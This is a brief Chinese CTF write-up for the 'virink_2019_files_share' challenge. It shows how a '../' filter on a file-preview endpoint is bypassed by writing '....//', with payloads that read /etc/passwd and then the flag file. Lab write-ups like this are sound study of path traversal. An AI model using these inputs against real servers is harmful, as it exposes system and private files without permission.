---
title: virink_2019_files_share、
date: 2024-09-24 20:28:25
tags: 任意文件执行
categories: 刷题笔记
---

## virink_2019_files_share

我们打开页面源码发现一个提示

![image-20240924205211600](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409242052708.png)

flag在f1ag_Is_h3re

我们扫描url发现uploads文件夹

<!--more-->

![image-20240924205936244](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409242059285.png)

点击Preview，我们发现任意文件下载

我们用../index.php，发现../被过滤了

![image-20240924210202198](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409242102242.png)

那我们使用双写绕过

```
preview?f=....//....//....//....//....//....//....//....//....//....//etc..//passwd 
```

![image-20240924210601293](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409242106358.png)

成功绕过

我们直接访问flag，得到flag

```
/preview?f=....//....//....//....//....//....//....//....//....//....//f1ag_Is_h3re..//flag
```

![image-20240924210728559](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409242107703.png)
